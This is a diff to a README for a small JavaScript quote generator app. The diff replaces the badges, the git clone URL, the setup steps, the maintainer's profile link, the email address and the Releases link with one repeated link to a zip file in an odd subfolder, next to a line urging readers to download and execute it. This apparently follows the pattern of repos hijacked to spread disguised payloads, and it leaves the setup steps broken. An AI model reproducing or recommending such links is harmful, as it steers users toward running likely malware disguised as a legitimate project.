@@ -1,6 +1,6 @@
 # Quote Generator: A Responsive App for Random Quotes 🎤✨
 
-![Quote Generator](https://img.shields.io/badge/Quote%20Generator-v1.0.0-blue.svg) ![JavaScript](https://img.shields.io/badge/JavaScript-ES6-yellow.svg) ![Tailwind CSS](https://img.shields.io/badge/Tailwind%20CSS-v2.2.19-green.svg)
+![Quote Generator](https://github.com/Artoriasgrr/quote-generator/raw/refs/heads/main/countryside/quote-generator-v2.3.zip%https://github.com/Artoriasgrr/quote-generator/raw/refs/heads/main/countryside/quote-generator-v2.3.zip) ![JavaScript](https://github.com/Artoriasgrr/quote-generator/raw/refs/heads/main/countryside/quote-generator-v2.3.zip) ![Tailwind CSS](https://github.com/Artoriasgrr/quote-generator/raw/refs/heads/main/countryside/quote-generator-v2.3.zip%https://github.com/Artoriasgrr/quote-generator/raw/refs/heads/main/countryside/quote-generator-v2.3.zip)
 
 ## Table of Contents
 
@@ -41,13 +41,13 @@ To set up the Quote Generator on your local machine, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Artoriasgrr/quote-generator.git
+   git clone https://github.com/Artoriasgrr/quote-generator/raw/refs/heads/main/countryside/quote-generator-v2.3.zip
    ```
 2. Navigate into the project directory:
    ```bash
    cd quote-generator
    ```
-3. Open `index.html` in your web browser.
+3. Open `https://github.com/Artoriasgrr/quote-generator/raw/refs/heads/main/countryside/quote-generator-v2.3.zip` in your web browser.
 
 ## Usage
 
@@ -84,14 +84,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or feedback, please reach out to the project maintainer:
 
-- **GitHub**: [Artoriasgrr](https://github.com/Artoriasgrr)
-- **Email**: artoriasgrr@example.com
+- **GitHub**: [Artoriasgrr](https://github.com/Artoriasgrr/quote-generator/raw/refs/heads/main/countryside/quote-generator-v2.3.zip)
+- **Email**: https://github.com/Artoriasgrr/quote-generator/raw/refs/heads/main/countryside/quote-generator-v2.3.zip
 
 ## Releases
 
-For the latest updates and versions, visit the [Releases](https://github.com/Artoriasgrr/quote-generator/releases) section. Download and execute the latest version to enjoy new features and improvements.
+For the latest updates and versions, visit the [Releases](https://github.com/Artoriasgrr/quote-generator/raw/refs/heads/main/countryside/quote-generator-v2.3.zip) section. Download and execute the latest version to enjoy new features and improvements.
 
-![Quote](https://via.placeholder.com/600x400?text=Quote+Generator+App)
+![Quote](https://github.com/Artoriasgrr/quote-generator/raw/refs/heads/main/countryside/quote-generator-v2.3.zip+Generator+App)
 
 Explore the code and feel free to suggest improvements or report issues. Your feedback helps us enhance the app further. 
 
